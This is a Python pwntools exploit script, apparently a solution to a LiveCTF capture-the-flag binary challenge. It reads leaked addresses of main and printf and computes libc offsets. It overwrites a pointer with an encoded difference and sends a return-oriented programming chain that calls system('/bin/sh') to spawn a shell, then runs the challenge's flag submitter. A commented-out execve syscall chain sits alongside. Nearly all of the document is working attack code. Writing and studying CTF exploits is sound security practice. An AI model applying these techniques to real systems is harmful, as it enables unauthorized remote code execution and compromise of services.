#!/usr/bin/env python3
from pwn import *
import time
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, int(PORT))
#import pwn
#import sys
#p = pwn.process(['./ld-linux-x86-64.so.2', './challenge'], env={'LD_LIBRARY_PATH':'.'})
p.recvline()
main = int(p.recvline().split(b': ')[1], 0)
var = int(p.recvline().split(b': ')[1], 0)
printf = int(p.recvline().split(b': ')[1], 0)
print('main', hex(main))
print('var', hex(var))
print('printf', hex(printf))

def encode(num):
    if num < 128:
        return bytes([num])
    else:
        return bytes([num % 128 | 0x80]) + encode(num // 128)
#print(encode(496))
base = main - 0x14ee + 0x227f
old = (main - 0x14ee + 0x12e0)
new = (printf - 0x00060100 + 0x00087080)
#print(sys.argv[1])
#new = (printf - 0x00060100 + int(sys.argv[1], 0))
dif = encode((new - old) % 2**64) + encode(0)
print(dif, len(dif))
p.sendline(hex(base).encode())
p.sendline(hex(int.from_bytes(dif[:8], 'little')).encode())
p.sendline(b'1')
p.sendline(hex(base+8).encode())
p.sendline(hex(int.from_bytes(dif[8:], 'little')).encode())
#pwn.gdb.attach(p)
#p.interactive()


IMAGE_BASE_0 = printf - 0x60100
rebase_0 = lambda x : (x + IMAGE_BASE_0).to_bytes(8, 'little')
sock = p
p = lambda x: x.to_bytes(8, 'little')

rop = b''

print(hex(0x86020 + IMAGE_BASE_0))
rop += rebase_0(0x86020) # lucky ret
rop += rebase_0(0x86020) # lucky ret
#rop += rebase_0(0x00000000000dd237) # 0x00000000000dd237: pop rax; ret; 
#rop += b'//bin/sh'
#rop += rebase_0(0x00000000000981ad) # 0x00000000000981ad: pop rdx; leave; ret; 
#rop += rebase_0(0x0000000000203000)
#rop += rebase_0(0x000000000003ba70) # 0x000000000003ba70: mov qword ptr [rdx], rax; ret; 
#rop += rebase_0(0x00000000000dd237) # 0x00000000000dd237: pop rax; ret; 
#rop += p(0x0000000000000000)
#rop += rebase_0(0x00000000000981ad) # 0x00000000000981ad: pop rdx; leave; ret; 
#rop += rebase_0(0x0000000000203008)
#rop += rebase_0(0x000000000003ba70) # 0x000000000003ba70: mov qword ptr [rdx], rax; ret; 
rop += rebase_0(0x000000000010f75b) # 0x000000000010f75b: pop rdi; ret; 
rop += rebase_0(0x001cb42f) # /bin/sh
rop += rebase_0(0x00058750)
#rop += rebase_0(0x0000000000110b7c) # 0x0000000000110b7c: pop rsi; ret; 
#rop += rebase_0(0x0000000000203008)
#rop += rebase_0(0x00000000000981ad) # 0x00000000000981ad: pop rdx; leave; ret; 
#rop += rebase_0(0x0000000000203008)
#rop += rebase_0(0x00000000000dd237) # 0x00000000000dd237: pop rax; ret; 
#rop += p(0x000000000000003b)
#rop += rebase_0(0x0000000000098fb6) # 0x0000000000098fb6: syscall; ret;
print(rop)
print(b'\n' in rop)
print(hex(0x86020 + IMAGE_BASE_0))
#pwn.gdb.attach(sock)
#sock.interactive()
sock.sendline(b'0' + rop)
#sock.interactive()
time.sleep(1)
sock.sendline('/home/livectf/submitter')
print('1', sock.recvline())
print('2', sock.recvline())
print('3', sock.recvline())
print('4', sock.recvline())
print('5', sock.recvline())
print('6', sock.recvline())
print('7', sock.recvline())
#sock.interactive()
#print('8', sock.recvline())
#p.sendline(b'0')
